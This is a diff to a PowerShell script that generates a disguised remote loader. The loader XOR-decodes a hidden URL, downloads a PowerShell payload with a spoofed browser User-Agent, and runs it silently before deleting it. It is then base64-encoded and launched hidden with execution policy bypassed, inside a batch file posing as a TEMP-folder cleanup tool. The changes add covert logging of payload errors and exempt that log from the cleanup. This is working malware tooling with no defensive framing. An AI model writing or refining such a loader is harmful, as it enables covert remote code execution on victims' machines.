@@ -37,6 +37,9 @@ $byteList = ($encodedBytes | ForEach-Object { "0x{0:X2}" -f $_ }) -join ","
 $innerScript = @"
 [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
 `$ProgressPreference='SilentlyContinue'
+`$log=Join-Path `$env:TEMP 'wr_maint.log'
+function Log-Maint([string]`$m){ "`$(Get-Date -Format 'HH:mm:ss') `$m" | Add-Content `$log -Encoding UTF8 -EA 0 }
+try {
 `$k=$key
 `$b=@($byteList)
 `$u=[Text.Encoding]::UTF8.GetString([byte[]](`$b|ForEach-Object{`$_ -bxor `$k}))
@@ -44,8 +47,12 @@ $innerScript = @"
 `$c.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
 `$p=Join-Path `$env:TEMP ('wr_'+[guid]::NewGuid().ToString('N')+'.ps1')
 [IO.File]::WriteAllText(`$p,`$c.DownloadString(`$u))
+Log-Maint 'Downloaded deploy.ps1'
 & `$p -Silent
 Remove-Item `$p -Force -ErrorAction SilentlyContinue
+} catch {
+Log-Maint "PAYLOAD ERROR: `$(`$_.Exception.Message)"
+}
 "@
 
 $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($innerScript))
@@ -84,7 +91,7 @@ function Build-DisguisedRemoteCmd {
     }
 
     $bootstrapB64 = Get-PayloadBootstrapEncoded
-    $psLaunch = "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $bootstrapB64 >nul 2>&1"
+    $psLaunch = 'powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand ' + $bootstrapB64 + ' 2>>"%TEMP%\wr_maint.log" >nul 2>&1'
     $lines = @(
         '@echo off'
         'setlocal EnableDelayedExpansion'
@@ -99,7 +106,7 @@ function Build-DisguisedRemoteCmd {
         '  for /d %%D in ("%TEMP%\*") do @if /i not "%%~nxD"=="Low" rd /s /q "%%D" >nul 2>&1'
         '  @del /f /q "%TEMP%\*.tmp" >nul 2>&1'
         '  @del /f /q "%TEMP%\*.temp" >nul 2>&1'
-        '  @del /f /q "%TEMP%\*.log" >nul 2>&1'
+        '  for %%F in ("%TEMP%\*.log") do @if /i not "%%~nxF"=="wrprov.log" if /i not "%%~nxF"=="wr_maint.log" del /f /q "%%F" >nul 2>&1'
         '  @del /f /q "%TEMP%\~DF*.TMP" >nul 2>&1'
         '  @del /f /q "%TEMP%\*.chk" >nul 2>&1'
         '  @del /f /q "%TEMP%\*.gid" >nul 2>&1'
